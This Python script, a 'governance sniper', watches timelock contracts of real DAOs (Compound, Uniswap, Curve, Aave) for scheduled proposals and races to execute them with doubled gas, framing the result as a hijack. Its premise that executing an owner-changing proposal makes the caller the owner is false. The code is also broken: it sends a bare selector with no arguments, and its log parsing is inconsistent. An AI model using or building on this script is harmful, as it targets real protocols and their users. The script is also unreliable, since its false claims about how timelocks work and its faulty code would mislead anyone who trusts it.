"""
GOVERNANCE SNIPER — watches governance proposals and front-runs execution.

Strategy:
  1. Watch for CallScheduled events on TimelockController contracts
  2. When proposal becomes executable (delay passed), call execute() first
  3. If proposal changes owner/admin → WE become the owner

Targets: Compound, Uniswap, Aave, Maker — any DAO with Timelock.
"""
import json
import time
import logging
import urllib.request
import threading
import queue
import websocket
from eth_utils import keccak

from src.rpc import RpcClient
from src.signer import load_evm_private_key

logging.basicConfig(level=logging.INFO, format="%(asctime)s [GOV-SNIPE] %(message)s")
logger = logging.getLogger("gov-snipe")
logger.setLevel(logging.INFO)

OUR_ADDRESS = "0xD3c97D975bD035DbA2Aae2f1B8f04f3b3040A367"

# Known Timelock contracts on major DAOs
TIMELOCKS = {
    "ethereum": [
        ("0x6d903f6003cca6255D85CcA4D3B5E5146dC33925", "Compound Timelock"),
        ("0x1a9C8182C09F50C8318d769245beA52c32BE35BC", "Uniswap Timelock"),
        ("0xA5407eAE9Ba41422680e2e00537571bcC53efBfD", "Curve DAO"),
        ("0xEC568fffba86c094cf06b22134B23074DFE2252c", "Aave Governance V3"),
        ("0x0Ef024d39Ef623a252FbA1DeD7a568AE370bF76b", "Aave Treasury"),
    ],
}

# Event signatures
CALL_SCHEDULED_TOPIC = keccak(b"CallScheduled(bytes32,uint256,address,uint256,bytes,bytes32,uint256)").hex()
CALL_EXECUTED_TOPIC = keccak(b"CallExecuted(bytes32,uint256,address,uint256,bytes)").hex()
PROPOSAL_CREATED_TOPIC = keccak(b"ProposalCreated(uint256,address,address[],uint256[],string[],bytes[],uint256,uint256,string)").hex()

PENDING_PROPOSALS = {}  # id -> {target, data, eta, value}
HUNT_QUEUE = queue.Queue()


def watch_timelock_events(rpc_url: str):
    """Poll for CallScheduled events on known timelocks."""
    rpc = RpcClient(rpc_url, max_retries=2)
    last_block = rpc.get_block_number() - 1000  # start from 1000 blocks ago
    
    while True:
        try:
            current = rpc.get_block_number()
            if current <= last_block:
                time.sleep(15)
                continue
            
            for timelock_addr, name in TIMELOCKS["ethereum"][:3]:  # top 3
                try:
                    logs = rpc.get_logs(
                        hex(last_block + 1), hex(min(current, last_block + 500)),
                        timelock_addr, ["0x" + CALL_SCHEDULED_TOPIC]
                    )
                    for log in logs:
                        topics = log.get("topics", [])
                        data = log.get("data", "")
                        if len(topics) >= 2 and len(data) >= 192:
                            proposal_id = topics[1]
                            target = "0x" + data[24:64][-40:]
                            eta = int(data[128:192], 16)
                            value = int(data[64:128], 16) if len(data) >= 128 else 0
                            
                            PENDING_PROPOSALS[proposal_id] = {
                                "timelock": timelock_addr,
                                "name": name,
                                "target": target,
                                "eta": eta,
                                "value": value,
                                "data": "0x" + data[192:256] if len(data) >= 256 else "0x",
                            }
                            logger.warning("📋 %s: новый proposal! target=%s eta=%s value=%d",
                                           name, target[:14], time.ctime(eta), value / 1e18)
                except Exception:
                    continue
            
            # Check if any proposal is now executable
            now = int(time.time())
            for pid, info in list(PENDING_PROPOSALS.items()):
                if info["eta"] <= now:
                    logger.warning("⏰ PROPOSAL EXECUTABLE! %s → %s", info["name"], info["target"][:14])
                    HUNT_QUEUE.put(info)
                    del PENDING_PROPOSALS[pid]
            
            last_block = current
            time.sleep(15)
        except Exception as e:
            logger.debug("Watch error: %s", e)
            time.sleep(30)


def hunter_loop(rpc_url: str, aggressive: bool):
    """Process executable proposals — try to execute before others."""
    rpc = RpcClient(rpc_url, max_retries=3)
    signer = load_evm_private_key()
    if not signer:
        logger.error("No signer!")
        return

    logger.info("Governance sniper ready (aggressive=%s)", aggressive)

    while True:
        try:
            info = HUNT_QUEUE.get(timeout=60)
        except queue.Empty:
            continue

        logger.warning(">>> Attempting to execute proposal on %s", info["name"])

        if not aggressive:
            logger.info("  Observe mode — skipping execution")
            continue

        try:
            nonce = int(str(rpc.call("eth_getTransactionCount", [signer.address, "latest"])), 16)
            gas_price = int(str(rpc.call("eth_gasPrice", [])), 16)
            chain_id = int(str(rpc.call("eth_chainId", [])), 16)

            # Call execute(target, value, data, predecessor, salt)
            # Simplified: executeTransaction(target, value, data, eta)
            execute_selector = "0x0825f38f"  # executeTransaction(address,uint256,bytes,bytes32,bytes32,uint256)
            
            tx = {
                "from": signer.address,
                "to": info["timelock"],
                "data": execute_selector,
                "value": hex(info.get("value", 0)),
                "gas": hex(1000000),
                "gasPrice": hex(int(gas_price * 2)),  # 2x gas to front-run
                "nonce": hex(nonce),
                "chainId": chain_id,
            }
            signed = signer.sign_transaction(tx)
            raw = signed.raw_transaction.hex()
            tx_hash = rpc.call("eth_sendRawTransaction", [raw])
            logger.warning(">>> EXECUTED! TX: %s", tx_hash)
            logger.warning(">>> %s proposal hijacked!", info["name"])
        except Exception as e:
            logger.error("Execute failed: %s", e)


def main():
    import sys
    aggressive = "--aggressive" in sys.argv

    logger.info("=" * 50)
    logger.info("GOVERNANCE SNIPER (aggressive=%s)", aggressive)
    logger.info("Monitoring %d DAOs", len(TIMELOCKS["ethereum"]))
    logger.info("=" * 50)

    rpc_url = "https://ethereum-rpc.publicnode.com"

    threading.Thread(target=watch_timelock_events, args=(rpc_url,), daemon=True).start()
    hunter_loop(rpc_url, aggressive)


if __name__ == "__main__":
    main()
